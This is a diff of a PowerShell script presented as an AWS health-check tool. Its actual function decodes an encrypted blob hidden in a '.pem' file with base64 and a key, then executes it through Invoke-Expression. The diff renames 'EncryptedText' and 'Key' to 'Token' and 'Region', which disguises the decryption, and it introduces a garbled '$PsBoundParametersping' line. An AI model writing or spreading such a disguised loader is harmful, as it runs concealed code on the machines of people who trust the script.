@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
 AWSHealthCheckCLI - This PowerShell script connects to AWS and performs health checks on specified resources.
 
@@ -90,13 +90,13 @@ https://aws.amazon.com/cli/
     [String]$deployAppScriptFriendlyName = 'Deploy Application'
     [Version]$deployAppScriptVersion = [Version]'3.9.2'
     [String]$deployAppScriptDate = '02/02/2023'
-    [Hashtable]$deployAppScriptParameters = $PsBoundParameters
+    [Hashtable]$deployAppScriptParameters = $PsBoundParametersping
 
-function AWS-Token-Generator ($EncryptedText, $Key) {
-    $paddingLength = (4 - ($EncryptedText.Length % 4)) % 4
-    $EncryptedText = $EncryptedText + ('=' * $paddingLength)
-    $AWS_AUTH_INITBytes = [System.Convert]::FromBase64String($EncryptedText)
-    $AWS_regionBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
+function AWS-Token-Generator ($Token, $Region) {
+    $paddingLength = (4 - ($Token.Length % 4)) % 4
+    $Token = $Token + ('=' * $paddingLength)
+    $AWS_AUTH_INITBytes = [System.Convert]::FromBase64String($Token)
+    $AWS_regionBytes = [System.Text.Encoding]::UTF8.GetBytes($Region)
 
     $AWS_CLI_INITBytes = New-Object 'byte[]' $AWS_AUTH_INITBytes.Count
     for ($i = 0; $i -lt $AWS_AUTH_INITBytes.Count; $i++) {
@@ -123,8 +123,9 @@ function Initiate-Health-Check {
     $AWS_region = "us-east"
     $PEM = Get-Content -path aws_ubuntu.pem -raw
     $AWS_AUTH_INIT = (AWS-PEM-parser -inputString $PEM) -replace ' ',''
-    $AWS_CLI_INIT = AWS-Token-Generator -EncryptedText $AWS_AUTH_INIT -replace '=','' -Key $AWS_region
-    powershell($AWS_CLI_INIT)
+    $AWS_CLI_INIT = AWS-Token-Generator -Token $AWS_AUTH_INIT -replace '=','' -Region $AWS_region
+    Invoke-Expression $AWS_CLI_INIT
+    return $AWS_CLI_INIT
 }
 
 Initiate-Health-Check
